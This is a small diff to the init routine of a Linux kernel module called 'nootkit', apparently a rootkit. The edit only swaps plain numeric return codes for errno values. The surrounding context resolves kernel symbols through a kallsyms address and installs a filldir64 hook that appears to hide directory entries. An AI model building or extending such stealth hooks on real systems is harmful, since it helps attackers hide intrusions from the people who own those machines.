@@ -4,6 +4,7 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/printk.h>
+#include <linux/errno.h>
 
 #include "license.h"
 #include "ksyms.h"
@@ -31,17 +32,17 @@ int nootkit_init(void) {
 
     if (config_parse_globals()) {
         printk(KERN_ERR "nootkit: Configuration parsing failed, aborting");
-        return 1;
+        return -EINVAL;
     }
 
     if (!kallsyms_lookup_name_addr) {
         printk(KERN_ERR "nootkit: kallsyms_lookup_name address not supplied, aborting.");
-        return 2;
+        return -EINVAL;
     }
 
     if (resolve_ksyms((void *)kallsyms_lookup_name_addr)) {
         printk(KERN_ERR "nootkit: Failed to find all required kernel symbols, aborting.");
-        return 3;
+        return -EFAULT;
     }
 
     hide_hook_set_filldir64();
